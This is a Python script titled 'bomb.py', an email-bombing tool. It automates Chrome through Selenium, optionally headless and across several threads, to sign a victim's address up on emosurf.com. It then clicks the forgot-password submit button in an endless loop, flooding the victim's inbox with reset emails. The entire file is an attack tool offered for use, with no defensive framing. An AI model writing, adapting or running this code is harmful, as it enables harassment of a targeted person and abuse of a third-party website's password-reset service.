#!/usr/local/bin/python
# -*- coding: utf-8 -*

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import threading
import argparse
import time

parser = argparse.ArgumentParser(description='Use example: python bomb.py -e <email to spam> -t <amount of threads>')
parser.add_argument('victim',
                    type=str,
                    help='Enter victim email')
parser.add_argument('-t', '--threads',
                    type=int,
                    default=4,
                    help='Enter amount of threads (4 is set by default)')
parser.add_argument('-s', '--silence',
                    action='store_true',
                    help='Use this argument to run threads silently')
args = parser.parse_args()

victim = parser.parse_args()


def spam():
    if args.silence is False:
        driver = webdriver.Chrome()
        print('Thread(s) started in window(s)')
    else:
        options = Options()
        options.headless = True
        driver = webdriver.Chrome(options=options)
        print('Thread(s) started silently')

    driver.get('https://emosurf.com/')

    # click sub button
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[7]/button').click()

    # fill email and password
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(args.victim)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[2]/input').send_keys('John Doe')

    # make some clicks to send things to server
    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[3]/table/tbody/tr/td[1]/button').click()
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[3]/div[3]/button').click()

    # click person image
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[3]/img').click()

    # click forgot password text
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[4]/form/div[3]/a').click()

    # enter email
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(args.victim)

    while True:
        # click submit button
        driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[2]/button').click()


for k in range(args.threads):
    thread = threading.Thread(target=spam)
    thread.start()
    time.sleep(1)
